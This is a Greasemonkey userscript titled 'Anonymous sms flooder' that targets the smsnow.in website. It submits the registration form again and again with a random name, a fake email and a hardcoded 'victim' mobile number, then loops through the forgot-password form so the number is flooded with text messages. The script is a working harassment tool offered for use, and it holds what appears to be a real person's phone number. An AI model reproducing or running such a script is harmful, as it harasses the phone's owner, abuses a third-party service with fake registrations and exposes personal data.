// ==UserScript==
// @name          Anonymous sms flooder 
// @namespace     \m/\m/\m/
// @include       http://*.smsnow.in/*
// ==/UserScript==


//I am not responsible for any misuse of this script..
// Dont spam, ur ip can be tracked by the site if the receiver complains

var victim=8109642977;
var name='';
if(document.location=="http://www.smsnow.in/userRegistration.php"||document.location=="http://smsnow.in/userRegistration.php")
{
var chars = "abcdefghiklmnopqrstuvwxyz";
for (var i=0; i<10; i++) 
{
var rnum = Math.floor(Math.random() * chars.length);
name += chars.substring(rnum,rnum+1);
}
document.getElementById('name').value=name;
document.getElementById('mobileno').value=victim;
document.getElementById('email').value='sdsa'+Math.floor(Math.random()*1456484)+'@gmail.com';
document.getElementById('child1DOB').value=Math.floor(Math.random()*29);
document.getElementsByName('child1DOByear')[0].value="198"+Math.floor(Math.random()*9);void(0);
document.getElementsByName('C32')[0].checked= true;
document.getElementsByName('register')[0].click();

}


if(document.location=="http://www.smsnow.in/forgotpassword.php"||document.location=="http://smsnow.in/forgotpassword.php")
{
document.getElementById('mobileno').value=victim;
void(0);
document.getElementsByName('submit')[0].click();
}
if(document.location=='http://www.smsnow.in/'||document.location=='http://smsnow.in/')
document.location='http://www.smsnow.in/forgotpassword.php';